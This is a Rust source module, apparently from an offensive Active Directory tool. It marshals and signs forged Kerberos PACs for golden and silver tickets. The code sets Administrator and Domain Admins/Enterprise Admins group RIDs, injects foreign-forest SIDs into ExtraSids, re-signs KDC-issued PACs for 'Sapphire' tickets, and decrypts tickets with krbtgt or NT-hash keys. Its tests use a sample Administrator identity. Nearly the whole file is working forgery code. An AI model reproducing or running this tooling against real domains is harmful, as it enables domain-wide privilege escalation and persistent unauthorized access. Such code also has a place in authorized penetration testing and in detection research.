//! PAC (MS-PAC) marshaling for Kerberos ticket forging (golden / silver tickets).
//!
//! Marshals a forged PAC — KERB_VALIDATION_INFO + the two signatures
//! (SERVER_CHECKSUM + KDC_CHECKSUM) + PAC_CLIENT_INFO + PAC_REQUESTOR +
//! PAC_ATTRIBUTES for KB5020805 enforcement — and can also parse an existing
//! PACTYPE container.
//!
//! The KERB_VALIDATION_INFO NDR layout below (Type Serialization v1,
//! 4-byte-aligned; deferred region ending 8-aligned) was validated
//! byte-for-byte against a live Windows Server 2025 PAC.

use crate::{PacForgeError, Result};
use kerbcore::acceptor::EncTicketPart;

use crate::checksum;

// ---------------------------------------------------------------------------
// Small little-endian NDR byte-builder (Type Serialization v1, 4-byte aligned).
// ---------------------------------------------------------------------------
#[derive(Default)]
struct Nd {
    b: Vec<u8>,
}
impl Nd {
    fn u8(&mut self, v: u8) {
        self.b.push(v);
    }
    fn u16(&mut self, v: u16) {
        self.b.extend_from_slice(&v.to_le_bytes());
    }
    fn u32(&mut self, v: u32) {
        self.b.extend_from_slice(&v.to_le_bytes());
    }
    fn u64(&mut self, v: u64) {
        self.b.extend_from_slice(&v.to_le_bytes());
    }
    fn bytes(&mut self, v: &[u8]) {
        self.b.extend_from_slice(v);
    }
    fn align(&mut self, n: usize) {
        while !self.b.len().is_multiple_of(n) {
            self.b.push(0);
        }
    }
    fn rpc_unicode_hdr(&mut self, nchars: usize, referent: u32) {
        self.u16((nchars * 2) as u16);
        self.u16((nchars * 2) as u16);
        self.u32(referent);
    }
    fn cv_wstr(&mut self, s: &str) {
        let units: Vec<u16> = s.encode_utf16().collect();
        self.align(4);
        self.u32(units.len() as u32);
        self.u32(0);
        self.u32(units.len() as u32);
        for u in units {
            self.u16(u);
        }
    }
}

/// FILETIME (100ns ticks since 1601-01-01) for "now".
fn filetime_now() -> u64 {
    use std::time::{SystemTime, UNIX_EPOCH};
    let secs = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    (secs + 11_644_473_600) * 10_000_000
}

const FT_INFINITY: u64 = 0x7fff_ffff_ffff_ffff;

/// Parameters for a forged PAC / ticket.
pub struct ForgeIdentity {
    pub user: String,
    pub rid: u32,
    pub primary_gid: u32,
    pub group_rids: Vec<u32>,
    /// Domain SID sub-authorities after S-1-5 (i.e. `[21, a, b, c]`).
    pub domain_subauths: Vec<u32>,
    pub logon_server: String,
    pub logon_domain: String,
    /// Foreign-forest SIDs to inject into PAC's ExtraSids
    /// (KERB_VALIDATION_INFO.SidCount / ExtraSids — MS-PAC 2.5).
    /// Each entry is a SID's sub-authority chain **after** the fixed
    /// `S-1-5` prefix — e.g. `S-1-5-21-1122334455-9988776655-11223344-500`
    /// becomes `vec![21, 1122334455, 9988776655, 11223344, 500]`.
    /// Empty vec = write count=0 + null ptr (0.1.2 on-wire layout, backwards-compat).
    pub extra_sids: Vec<Vec<u32>>,
}

impl Default for ForgeIdentity {
    fn default() -> Self {
        Self {
            user: String::new(),
            rid: 500,
            primary_gid: 513,
            group_rids: Vec::new(),
            domain_subauths: Vec::new(),
            logon_server: String::new(),
            logon_domain: String::new(),
            extra_sids: Vec::new(),
        }
    }
}

impl ForgeIdentity {
    fn requestor_sid(&self) -> Vec<u8> {
        let mut subs = self.domain_subauths.clone();
        subs.push(self.rid);
        sid_bytes(&subs)
    }
}

fn sid_bytes(subauths: &[u32]) -> Vec<u8> {
    let mut v = vec![1u8, subauths.len() as u8, 0, 0, 0, 0, 0, 5];
    for s in subauths {
        v.extend_from_slice(&s.to_le_bytes());
    }
    v
}

fn ndr_sid(nd: &mut Nd, subauths: &[u32]) {
    nd.align(4);
    nd.u32(subauths.len() as u32);
    nd.u8(1);
    nd.u8(subauths.len() as u8);
    nd.bytes(&[0, 0, 0, 0, 0, 5]);
    for s in subauths {
        nd.u32(*s);
    }
}

/// Marshal KERB_VALIDATION_INFO (LOGON_INFO buffer content) as NDR Type Serialization v1.
pub fn build_kerb_validation_info(id: &ForgeIdentity) -> Vec<u8> {
    let now = filetime_now();
    let mut ref_id = 0x0002_0004u32;
    let mut next_ref = || {
        let r = ref_id;
        ref_id += 4;
        r
    };

    let eff_ref = next_ref();
    let full_ref = next_ref();
    let script_ref = next_ref();
    let profile_ref = next_ref();
    let home_ref = next_ref();
    let homedrive_ref = next_ref();
    let groups_ref = next_ref();
    let logonsrv_ref = next_ref();
    let logondom_ref = next_ref();
    let domainid_ref = next_ref();
    let extra_sids_ref = if id.extra_sids.is_empty() {
        0
    } else {
        next_ref()
    };

    let mut f = Nd::default();
    f.u64(now); // LogonTime
    f.u64(FT_INFINITY); // LogoffTime
    f.u64(FT_INFINITY); // KickOffTime
    f.u64(now); // PasswordLastSet
    f.u64(now); // PasswordCanChange
    f.u64(FT_INFINITY); // PasswordMustChange
    f.rpc_unicode_hdr(id.user.encode_utf16().count(), eff_ref);
    f.rpc_unicode_hdr(0, full_ref);
    f.rpc_unicode_hdr(0, script_ref);
    f.rpc_unicode_hdr(0, profile_ref);
    f.rpc_unicode_hdr(0, home_ref);
    f.rpc_unicode_hdr(0, homedrive_ref);
    f.u16(0); // LogonCount
    f.u16(0); // BadPasswordCount
    f.u32(id.rid); // UserId
    f.u32(id.primary_gid); // PrimaryGroupId
    f.u32(id.group_rids.len() as u32);
    f.u32(groups_ref);
    f.u32(0x0000_0020); // UserFlags
    f.bytes(&[0u8; 16]); // UserSessionKey
    f.rpc_unicode_hdr(id.logon_server.encode_utf16().count(), logonsrv_ref);
    f.rpc_unicode_hdr(id.logon_domain.encode_utf16().count(), logondom_ref);
    f.u32(domainid_ref);
    f.bytes(&[0u8; 8]); // LMKey
    f.u32(0x0000_0200); // UAC = NORMAL_ACCOUNT
    f.u32(0); // SubAuthStatus
    f.u64(0); // LastSuccessfulILogon
    f.u64(0); // LastFailedILogon
    f.u32(0); // FailedILogonCount
    f.u32(0); // Reserved3
    f.u32(id.extra_sids.len() as u32); // SidCount
    f.u32(extra_sids_ref); // ExtraSids ptr
    f.u32(0); // ResourceGroupDomainSid
    f.u32(0); // ResourceGroupCount
    f.u32(0); // ResourceGroupIds

    f.cv_wstr(&id.user);
    for _ in 0..5 {
        f.cv_wstr("");
    }
    f.align(4);
    f.u32(id.group_rids.len() as u32);
    for rid in &id.group_rids {
        f.u32(*rid);
        f.u32(0x0000_0007);
    }
    f.cv_wstr(&id.logon_server);
    f.cv_wstr(&id.logon_domain);
    ndr_sid(&mut f, &id.domain_subauths);

    if !id.extra_sids.is_empty() {
        // KERB_SID_AND_ATTRIBUTES[] conformant array (MS-PAC 2.2.1 + 2.5).
        f.align(4);
        f.u32(id.extra_sids.len() as u32); // MaxCount
        for _ in &id.extra_sids {
            f.u32(next_ref()); // Sid ptr (unique referent id)
            f.u32(0x0000_0007); // Attributes = SE_GROUP_MANDATORY|ENABLED_BY_DEFAULT|ENABLED
        }
        for subauths in &id.extra_sids {
            ndr_sid(&mut f, subauths);
        }
    }

    let body = f.b;
    let mut out = Nd::default();
    out.bytes(&[0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc]);
    out.u32(0);
    out.u32(0);
    out.u32(0x0002_0000);
    out.bytes(&body);
    while out.b.len() % 8 != 0 {
        out.u8(0);
    }
    let obl = (out.b.len() - 16) as u32;
    out.b[8..12].copy_from_slice(&obl.to_le_bytes());
    out.b
}

/// PAC_CLIENT_INFO (MS-PAC 2.7).
pub fn build_client_info(user: &str) -> Vec<u8> {
    let name: Vec<u16> = user.encode_utf16().collect();
    let mut nd = Nd::default();
    nd.u64(filetime_now());
    nd.u16((name.len() * 2) as u16);
    for u in name {
        nd.u16(u);
    }
    nd.b
}

/// PAC_ATTRIBUTES_INFO (MS-PAC 2.14).
pub fn build_attributes() -> Vec<u8> {
    let mut nd = Nd::default();
    nd.u32(2);
    nd.u32(1); // PAC_WAS_REQUESTED
    nd.b
}

/// PAC_REQUESTOR (MS-PAC 2.15): the requestor's SID (plain, non-NDR).
pub fn build_requestor(id: &ForgeIdentity) -> Vec<u8> {
    id.requestor_sid()
}

const SIG_HMAC_SHA1_96_AES256: i32 = 16;
const KERB_NON_KERB_CKSUM_SALT: i32 = 17;

fn aes256_checksum(key: &[u8], payload: &[u8]) -> Result<Vec<u8>> {
    // HMAC-SHA1-96-AES256 (cksumtype 16) over the PAC at the KERB-NON-KERB salt usage, via
    // kerbcore's typed key (RFC 3961 Kc-derived HMAC-SHA1-96) — replaces picky's ChecksumSuite.
    let k = kerbcore::KerberosKey::from_i32(18, key.to_vec())
        .map_err(|e| PacForgeError::Signature(format!("PAC checksum key: {e}")))?;
    Ok(k.checksum(KERB_NON_KERB_CKSUM_SALT as u32, payload))
}

/// Assemble a signed PACTYPE from the forged buffers.
///
/// `server_key` signs the whole PAC (SERVER_CHECKSUM); `kdc_key` signs the server
/// signature (KDC_CHECKSUM). For a golden TGT both are the krbtgt key; for a
/// silver ticket the server key is the service account's. `rc4` selects the
/// KERB_CHECKSUM_HMAC_MD5 (type -138) signatures for RC4 keys instead of the AES
/// HMAC-SHA1-96 (type 16) ones.
pub fn assemble_pac(
    id: &ForgeIdentity,
    server_key: &[u8],
    kdc_key: &[u8],
    rc4: bool,
) -> Result<Vec<u8>> {
    let sign = |key: &[u8], data: &[u8]| -> Result<Vec<u8>> {
        if rc4 {
            Ok(checksum::hmac_md5_checksum(key, KERB_NON_KERB_CKSUM_SALT, data).to_vec())
        } else {
            aes256_checksum(key, data)
        }
    };
    let mut sig_buf = Nd::default();
    if rc4 {
        sig_buf.u32(checksum::SIG_HMAC_MD5 as u32);
        sig_buf.bytes(&[0u8; 16]);
    } else {
        sig_buf.u32(SIG_HMAC_SHA1_96_AES256 as u32);
        sig_buf.bytes(&[0u8; 12]);
    }
    let sig_template = sig_buf.b;

    let buffers: Vec<(u32, Vec<u8>)> = vec![
        (PAC_LOGON_INFO, build_kerb_validation_info(id)),
        (PAC_CLIENT_INFO_TYPE, build_client_info(&id.user)),
        (PAC_ATTRIBUTES_INFO, build_attributes()),
        (PAC_REQUESTOR, build_requestor(id)),
        (PAC_SERVER_CHECKSUM, sig_template.clone()),
        (PAC_KDC_CHECKSUM, sig_template.clone()),
    ];

    let n = buffers.len();
    let mut data_off = 8 + n * 16;
    let mut descriptors = Nd::default();
    descriptors.u32(n as u32);
    descriptors.u32(0);
    let mut blocks: Vec<(usize, usize)> = Vec::new();
    let mut data = Vec::new();
    for (t, d) in &buffers {
        descriptors.u32(*t);
        descriptors.u32(d.len() as u32);
        descriptors.u64(data_off as u64);
        blocks.push((data_off, d.len()));
        data.extend_from_slice(d);
        while data.len() % 8 != 0 {
            data.push(0);
        }
        data_off = 8 + n * 16 + data.len();
    }
    let mut pac = descriptors.b;
    pac.extend_from_slice(&data);

    let server_sig = sign(server_key, &pac)?;
    let (srv_off, _) = blocks[4];
    pac[srv_off + 4..srv_off + 4 + server_sig.len()].copy_from_slice(&server_sig);

    let kdc_sig = sign(kdc_key, &server_sig)?;
    let (kdc_off, _) = blocks[5];
    pac[kdc_off + 4..kdc_off + 4 + kdc_sig.len()].copy_from_slice(&kdc_sig);

    Ok(pac)
}

/// Re-sign an already-assembled PAC under new keys. Zeros the two
/// signature slots (SERVER + KDC), computes new signatures with
/// `server_key` / `kdc_key`, patches them in-place, and returns the
/// updated bytes.
///
/// Used by the Sapphire flow: the KDC emits a PAC signed under the target
/// service's key; the caller extracts it and re-signs under whichever key
/// the *onward* ticket will be sealed with (typically the same service
/// key, giving a silver-shaped ticket with a KDC-populated PAC).
pub fn re_sign_pac(
    pac_bytes: &[u8],
    server_key: &[u8],
    kdc_key: &[u8],
    rc4: bool,
) -> Result<Vec<u8>> {
    let mut pac = pac_bytes.to_vec();
    let parsed = parse_pac(&pac)?;
    // Locate the two signature buffers.
    let (srv_off, srv_len) = descriptor_offset_len(&pac, &parsed, PAC_SERVER_CHECKSUM)?;
    let (kdc_off, kdc_len) = descriptor_offset_len(&pac, &parsed, PAC_KDC_CHECKSUM)?;
    // Zero both signature bodies (leaving the 4-byte cksumtype prefix).
    for i in 0..srv_len - 4 {
        pac[srv_off + 4 + i] = 0;
    }
    for i in 0..kdc_len - 4 {
        pac[kdc_off + 4 + i] = 0;
    }
    let sign = |key: &[u8], data: &[u8]| -> Result<Vec<u8>> {
        if rc4 {
            Ok(checksum::hmac_md5_checksum(key, KERB_NON_KERB_CKSUM_SALT, data).to_vec())
        } else {
            aes256_checksum(key, data)
        }
    };
    let server_sig = sign(server_key, &pac)?;
    pac[srv_off + 4..srv_off + 4 + server_sig.len()].copy_from_slice(&server_sig);
    let kdc_sig = sign(kdc_key, &server_sig)?;
    pac[kdc_off + 4..kdc_off + 4 + kdc_sig.len()].copy_from_slice(&kdc_sig);
    Ok(pac)
}

fn descriptor_offset_len(pac: &[u8], parsed: &ParsedPac, ul_type: u32) -> Result<(usize, usize)> {
    let idx = parsed
        .buffers
        .iter()
        .position(|b| b.ul_type == ul_type)
        .ok_or(PacForgeError::MissingBuffer(ul_type))?;
    let base = 8 + idx * 16;
    let size = u32::from_le_bytes(pac[base + 4..base + 8].try_into().unwrap()) as usize;
    let offset = u64::from_le_bytes(pac[base + 8..base + 16].try_into().unwrap()) as usize;
    Ok((offset, size))
}

/// key usage 2 — EncTicketPart sealed under the server (here krbtgt) key.
const KEY_USAGE_TICKET: i32 = 2;

// PAC_INFO_BUFFER ulType values (MS-PAC 2.4).
pub const PAC_LOGON_INFO: u32 = 1;
pub const PAC_SERVER_CHECKSUM: u32 = 6;
pub const PAC_KDC_CHECKSUM: u32 = 7;
pub const PAC_CLIENT_INFO_TYPE: u32 = 10;
pub const PAC_TICKET_CHECKSUM: u32 = 16;
pub const PAC_ATTRIBUTES_INFO: u32 = 17;
pub const PAC_REQUESTOR: u32 = 18;

/// One parsed PAC buffer (type + raw payload).
#[derive(Debug, Clone)]
pub struct PacBuf {
    pub ul_type: u32,
    pub data: Vec<u8>,
}

/// A dissected PACTYPE container.
#[derive(Debug, Clone)]
pub struct ParsedPac {
    pub buffers: Vec<PacBuf>,
}

impl ParsedPac {
    pub fn get(&self, ul_type: u32) -> Option<&PacBuf> {
        self.buffers.iter().find(|b| b.ul_type == ul_type)
    }
}

/// Parse a PACTYPE container (MS-PAC 2.3).
pub fn parse_pac(pac: &[u8]) -> Result<ParsedPac> {
    if pac.len() < 8 {
        return Err(PacForgeError::Truncated("PAC too short".into()));
    }
    let c_buffers = u32::from_le_bytes(pac[0..4].try_into().unwrap()) as usize;
    let version = u32::from_le_bytes(pac[4..8].try_into().unwrap());
    if version != 0 {
        return Err(PacForgeError::InvalidVersion(version));
    }
    // Bounded-alloc preflight: c_buffers is attacker-controlled (comes from
    // the first 4 bytes of the PAC blob). Each PAC_INFO_BUFFER header is 16
    // bytes and must fit after the 8-byte PACTYPE header, so the physical
    // upper bound is (pac.len() - 8) / 16. Rejecting before Vec::with_capacity
    // stops a hostile PAC with c_buffers = 0xFFFF_FFFF from claiming 128 GB.
    let max_buffers = pac.len().saturating_sub(8) / 16;
    if c_buffers > max_buffers {
        return Err(PacForgeError::Truncated(format!(
            "PAC c_buffers={c_buffers} exceeds physical max {max_buffers} for {}-byte blob",
            pac.len()
        )));
    }
    let mut buffers = Vec::with_capacity(c_buffers);
    for i in 0..c_buffers {
        let base = 8 + i * 16;
        let hdr = pac
            .get(base..base + 16)
            .ok_or_else(|| PacForgeError::Truncated(format!("truncated PAC_INFO_BUFFER {i}")))?;
        let ul_type = u32::from_le_bytes(hdr[0..4].try_into().unwrap());
        let size = u32::from_le_bytes(hdr[4..8].try_into().unwrap()) as usize;
        let offset = u64::from_le_bytes(hdr[8..16].try_into().unwrap()) as usize;
        let data = pac
            .get(offset..offset + size)
            .ok_or_else(|| {
                PacForgeError::Truncated(format!(
                    "PAC buffer {i} range {offset}+{size} out of bounds"
                ))
            })?
            .to_vec();
        buffers.push(PacBuf { ul_type, data });
    }
    Ok(ParsedPac { buffers })
}

/// Human name for a PAC buffer type (for analysis dumps).
pub fn buf_name(t: u32) -> &'static str {
    match t {
        1 => "LOGON_INFO (KERB_VALIDATION_INFO)",
        2 => "CREDENTIALS",
        6 => "SERVER_CHECKSUM",
        7 => "KDC_CHECKSUM",
        10 => "CLIENT_INFO",
        12 => "UPN_DNS_INFO",
        16 => "TICKET_CHECKSUM",
        17 => "ATTRIBUTES_INFO",
        18 => "REQUESTOR",
        _ => "?",
    }
}

/// Pull the PAC bytes out of an EncTicketPart's raw authorization-data (`SEQUENCE OF
/// AuthorizationData`): AD-IF-RELEVANT (type 1) → inner SEQUENCE OF → AD-WIN2K-PAC (type 128).
/// 1.5.3: walks the DER via kerbcore's total decoder (was picky `AuthorizationData`).
pub fn extract_pac(auth_data: &[u8]) -> Result<Vec<u8>> {
    use kerbcore::der::{context_tag, one_or, Der, TAG_OCTET_STRING, TAG_SEQUENCE};
    fn walk(seq_of: &[u8]) -> Option<Vec<u8>> {
        let mut r = Der::new(seq_of);
        while !r.is_empty() {
            let (_, elem) = r.read_tlv().ok()?;
            let mut er = Der::new(elem);
            let ad_type = {
                let mut i = Der::new(er.expect(context_tag(0)).ok()?);
                i.read_integer().ok()?
            };
            let ad_data = one_or(er.expect(context_tag(1)).ok()?, TAG_OCTET_STRING).ok()?;
            match ad_type {
                128 => return Some(ad_data.to_vec()), // AD-WIN2K-PAC
                1 => {
                    // AD-IF-RELEVANT — its ad-data is itself a SEQUENCE OF AuthorizationData.
                    if let Some(p) = walk(one_or(ad_data, TAG_SEQUENCE).ok()?) {
                        return Some(p);
                    }
                }
                _ => {}
            }
        }
        None
    }
    let seq = one_or(auth_data, TAG_SEQUENCE)
        .map_err(|e| PacForgeError::Decode(format!("authorization-data: {e:?}")))?;
    walk(seq).ok_or(PacForgeError::NoAuthData)
}

/// Decrypt an EncTicketPart ciphertext with an AES256 key (usage 2) and return
/// (the decoded enc-ticket-part, the raw PAC bytes). Doubles as a live proof
/// that an AES256 key is correct — AES decryption is integrity-protected, so a
/// wrong key fails here rather than yielding garbage.
pub fn decrypt_ticket_pac_aes256(
    ticket_cipher: &[u8],
    krbtgt_aes256: &[u8],
) -> Result<(EncTicketPart, Vec<u8>)> {
    let key = kerbcore::KerberosKey::from_i32(18, krbtgt_aes256.to_vec())
        .map_err(|e| PacForgeError::Decrypt(format!("AES256 key: {e}")))?;
    let plain = key
        .decrypt(KEY_USAGE_TICKET as u32, ticket_cipher)
        .map_err(|e| {
            PacForgeError::Decrypt(format!(
                "decrypt EncTicketPart with AES256 key (wrong key?): {e}"
            ))
        })?;
    let etp = kerbcore::acceptor::parse_enc_ticket_part(&plain)
        .map_err(|e| PacForgeError::Decode(format!("decode EncTicketPart: {e:?}")))?;
    if etp.authorization_data.is_empty() {
        return Err(PacForgeError::NoAuthData);
    }
    let pac = extract_pac(&etp.authorization_data)?;
    Ok((etp, pac))
}

/// Decrypt an EncTicketPart ciphertext with an RC4 NT-hash key (usage 2).
pub fn decrypt_ticket_pac_rc4(
    ticket_cipher: &[u8],
    nt_hash_key: &[u8],
) -> Result<(EncTicketPart, Vec<u8>)> {
    let plain = checksum::rc4_decrypt(nt_hash_key, KEY_USAGE_TICKET, ticket_cipher)
        .map_err(|e| PacForgeError::Decrypt(format!("decrypt EncTicketPart with RC4 key: {e}")))?;
    let etp = kerbcore::acceptor::parse_enc_ticket_part(&plain)
        .map_err(|e| PacForgeError::Decode(format!("decode EncTicketPart: {e:?}")))?;
    if etp.authorization_data.is_empty() {
        return Err(PacForgeError::NoAuthData);
    }
    let pac = extract_pac(&etp.authorization_data)?;
    Ok((etp, pac))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample() -> ForgeIdentity {
        ForgeIdentity {
            user: "Administrator".into(),
            rid: 500,
            primary_gid: 513,
            group_rids: vec![513, 512, 520, 518, 519],
            domain_subauths: vec![21, 1111111111, 2222222222, 3333333333],
            logon_server: "DC01".into(),
            logon_domain: "CORP".into(),
            extra_sids: vec![],
        }
    }

    #[test]
    fn logon_info_layout() {
        let li = build_kerb_validation_info(&sample());
        assert_eq!(&li[0..8], &[0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc]);
        let obl = u32::from_le_bytes(li[8..12].try_into().unwrap()) as usize;
        assert_eq!(&li[16..20], &[0x00, 0x00, 0x02, 0x00]);
        assert_eq!(obl, li.len() - 16);
        assert_eq!(li.len() % 8, 0);
        let uid = u32::from_le_bytes(li[120..124].try_into().unwrap());
        assert_eq!(uid, 500);
        let pgid = u32::from_le_bytes(li[124..128].try_into().unwrap());
        assert_eq!(pgid, 513);
    }

    #[test]
    fn pac_container_and_signatures() {
        let key = [0x42u8; 32];
        let pac = assemble_pac(&sample(), &key, &key, false).unwrap();
        let parsed = parse_pac(&pac).unwrap();
        for t in [
            PAC_LOGON_INFO,
            PAC_CLIENT_INFO_TYPE,
            PAC_ATTRIBUTES_INFO,
            PAC_REQUESTOR,
            PAC_SERVER_CHECKSUM,
            PAC_KDC_CHECKSUM,
        ] {
            assert!(parsed.get(t).is_some(), "missing buffer {t}");
        }
        let srv = parsed.get(PAC_SERVER_CHECKSUM).unwrap();
        let stored_srv_sig = srv.data[4..16].to_vec();
        let mut zeroed = pac.clone();
        for i in 0..parsed.buffers.len() {
            let base = 8 + i * 16;
            let t = u32::from_le_bytes(zeroed[base..base + 4].try_into().unwrap());
            let off = u64::from_le_bytes(zeroed[base + 8..base + 16].try_into().unwrap()) as usize;
            if t == PAC_SERVER_CHECKSUM || t == PAC_KDC_CHECKSUM {
                for b in zeroed[off + 4..off + 16].iter_mut() {
                    *b = 0;
                }
            }
        }
        let recomputed = aes256_checksum(&key, &zeroed).unwrap();
        assert_eq!(recomputed, stored_srv_sig, "server checksum mismatch");
        let kdc = parsed.get(PAC_KDC_CHECKSUM).unwrap();
        let recomputed_kdc = aes256_checksum(&key, &stored_srv_sig).unwrap();
        assert_eq!(recomputed_kdc, kdc.data[4..16], "kdc checksum mismatch");
    }

    /// Regression: `parse_pac` used to do `Vec::with_capacity(c_buffers)`
    /// from the attacker-controlled u32 at offset 0. A hostile blob with
    /// `c_buffers = 0x7FFF_FFFF` and no payload would trigger a 128 GB
    /// allocation before touching the payload check. Preflight must reject
    /// in microseconds without allocating.
    #[test]
    fn parse_pac_rejects_hostile_c_buffers() {
        let mut hostile = Vec::new();
        hostile.extend_from_slice(&0x7FFF_FFFFu32.to_le_bytes()); // c_buffers (hostile)
        hostile.extend_from_slice(&0u32.to_le_bytes()); // version = 0
                                                        // no PAC_INFO_BUFFER payload follows — physical max is 0
        let start = std::time::Instant::now();
        let err = parse_pac(&hostile).unwrap_err();
        let elapsed_ms = start.elapsed().as_millis();
        let msg = format!("{err}");
        assert!(
            msg.contains("c_buffers") && msg.contains("exceeds"),
            "expected bounded-alloc rejection, got: {msg}"
        );
        assert!(
            elapsed_ms < 50,
            "preflight must reject in <50ms, took {elapsed_ms}ms — probably allocated"
        );
    }

    /// Guard against integer-overflow on c_buffers = u32::MAX.
    #[test]
    fn parse_pac_rejects_u32_max_c_buffers() {
        let mut hostile = Vec::new();
        hostile.extend_from_slice(&0xFFFF_FFFFu32.to_le_bytes());
        hostile.extend_from_slice(&0u32.to_le_bytes());
        assert!(parse_pac(&hostile).is_err());
    }

    #[test]
    fn requestor_sid_appends_rid() {
        let id = sample();
        let sid = id.requestor_sid();
        assert_eq!(&sid[sid.len() - 4..], &500u32.to_le_bytes());
        assert_eq!(sid[0], 1);
        assert_eq!(sid[1], 5);
    }

    /// Empty extra_sids must produce the identical on-wire layout as 0.1.2:
    /// SidCount = 0, ExtraSids pointer = 0, no deferred bytes appended.
    /// Fixed-offset regression: UserId still at output offset 120, and the
    /// bytes with no extras must equal the baseline byte-for-byte.
    #[test]
    fn extra_sids_empty_matches_previous_layout() {
        let baseline = build_kerb_validation_info(&sample());
        let mut id = sample();
        id.extra_sids = vec![];
        let with_field = build_kerb_validation_info(&id);
        assert_eq!(
            with_field, baseline,
            "empty extra_sids must not change on-wire bytes vs 0.1.2 layout"
        );
        // SidCount slot (body offset 196 + 20-byte preamble = output offset 216).
        assert_eq!(
            u32::from_le_bytes(baseline[216..220].try_into().unwrap()),
            0
        );
        // ExtraSids ptr slot (output offset 220).
        assert_eq!(
            u32::from_le_bytes(baseline[220..224].try_into().unwrap()),
            0
        );
    }

    /// A single foreign SID lands in the KERB_VALIDATION_INFO with SidCount=1,
    /// a nonzero ExtraSids referent, and the SID's byte pattern appears in the
    /// deferred region (revision + subauth count + ident authority + N LE u32
    /// subauthorities, per MS-DTYP 2.4.2.2).
    #[test]
    fn extra_sids_single_foreign_sid_writes_kerb_sid_and_attributes() {
        let mut id = sample();
        let foreign = vec![21u32, 100, 200, 300, 1234];
        id.extra_sids = vec![foreign.clone()];
        let li = build_kerb_validation_info(&id);
        // SidCount = 1, ExtraSids ptr = nonzero.
        assert_eq!(u32::from_le_bytes(li[216..220].try_into().unwrap()), 1);
        assert_ne!(
            u32::from_le_bytes(li[220..224].try_into().unwrap()),
            0,
            "ExtraSids referent must be non-null when the array is populated"
        );
        // Scan for the SID's on-wire bytes: revision 0x01, 5 subauthorities,
        // 6-byte big-endian identifier authority (S-1-5 = 00 00 00 00 00 05),
        // then 5 sub-authorities as LE u32.
        let mut needle = vec![0x01u8, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05];
        for s in &foreign {
            needle.extend_from_slice(&s.to_le_bytes());
        }
        assert!(
            li.windows(needle.len()).any(|w| w == needle),
            "foreign SID byte pattern not found in deferred region"
        );
        // Buffer must be strictly longer than the empty baseline.
        let baseline = build_kerb_validation_info(&sample());
        assert!(li.len() > baseline.len(), "extras must extend the buffer");
    }
}
